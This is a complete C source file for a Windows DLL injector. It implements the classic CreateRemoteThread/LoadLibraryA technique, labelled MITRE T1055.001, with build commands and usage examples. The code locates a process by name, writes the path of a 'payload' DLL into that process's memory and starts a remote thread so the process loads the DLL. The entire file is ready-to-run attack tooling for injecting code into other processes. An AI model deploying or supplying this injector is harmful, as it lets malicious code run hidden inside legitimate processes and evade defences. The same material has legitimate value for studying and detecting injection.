/*
 * Windows DLL Injection via CreateRemoteThread
 *
 * Classic DLL injection technique (MITRE T1055.001):
 * 1. Find target process by name
 * 2. Open a handle with required privileges
 * 3. Allocate memory in the target process
 * 4. Write the path of the DLL to inject
 * 5. Call LoadLibraryA in the target via a remote thread
 *
 * Build:  x86_64-w64-mingw32-gcc injector.c -o injector.exe
 * Usage:  injector.exe <process_name> [dll_path]
 *         Example: injector.exe notepad.exe C:\path\to\payload.dll
 *
 * If no DLL path is given, a default path is used (see DEFAULT_DLL).
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

/* Default payload path if none is provided as argument.
   Change this to point to your compiled payload DLL. */
#define DEFAULT_DLL "C:\\path\\to\\payload.dll"

/*
 * Iterates through running processes and returns the PID
 * of the first match for the given name. Case-insensitive.
 * Returns 0 if not found.
 */
static DWORD find_process(const char *name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(entry);

    if (!Process32First(snapshot, &entry)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (_stricmp(entry.szExeFile, name) == 0) {
            CloseHandle(snapshot);
            return entry.th32ProcessID;
        }
    } while (Process32Next(snapshot, &entry));

    CloseHandle(snapshot);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("DLL Injector — classic CreateRemoteThread technique\n");
        printf("Usage: %s <process_name> [dll_path]\n", argv[0]);
        printf("Example: %s notepad.exe C:\\path\\to\\payload.dll\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    const char *dll_path = (argc >= 3) ? argv[2] : DEFAULT_DLL;

    printf("[*] Target process: %s\n", target);
    printf("[*] Payload DLL:    %s\n\n", dll_path);

    /* Step 1: Find the target process PID */
    DWORD pid = find_process(target);
    if (pid == 0) {
        printf("[!] Process '%s' not found. Is it running?\n", target);
        return 1;
    }
    printf("[+] PID found: %lu\n", pid);

    /* Step 2: Open a handle with required access rights */
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);

    if (hProcess == NULL) {
        printf("[!] OpenProcess failed (error: %lu)\n", GetLastError());
        printf("    Note: some processes require administrator privileges\n");
        return 1;
    }
    printf("[+] Process handle acquired\n");

    /* Step 3: Allocate memory in the target process for the DLL path */
    size_t path_size = strlen(dll_path) + 1;
    LPVOID remote_buffer = VirtualAllocEx(
        hProcess, NULL, path_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (remote_buffer == NULL) {
        printf("[!] VirtualAllocEx failed (error: %lu)\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Remote memory allocated at: %p\n", remote_buffer);

    /* Step 4: Write the DLL path into that remote buffer */
    SIZE_T bytes_written;
    if (!WriteProcessMemory(hProcess, remote_buffer, dll_path,
                             path_size, &bytes_written)) {
        printf("[!] WriteProcessMemory failed (error: %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] DLL path written (%zu bytes)\n", bytes_written);

    /* Step 5: Resolve LoadLibraryA address.
     * kernel32.dll is mapped at the same base address in every process
     * within a Windows boot session, so LoadLibraryA's address in our
     * process is valid in the target process too. */
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        printf("[!] Failed to resolve LoadLibraryA\n");
        VirtualFreeEx(hProcess, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] LoadLibraryA at: %p\n", (void *)pLoadLibrary);

    /* Step 6: Create a remote thread that calls LoadLibraryA
     * with our remote buffer (containing the DLL path) as argument.
     * The target process will load our DLL, invoking its DllMain. */
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        remote_buffer, 0, NULL);

    if (hThread == NULL) {
        printf("[!] CreateRemoteThread failed (error: %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Remote thread created — injection triggered\n");

    /* Wait for the LoadLibrary call to complete */
    WaitForSingleObject(hThread, INFINITE);
    printf("[*] Injection complete\n");

    /* Cleanup */
    VirtualFreeEx(hProcess, remote_buffer, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
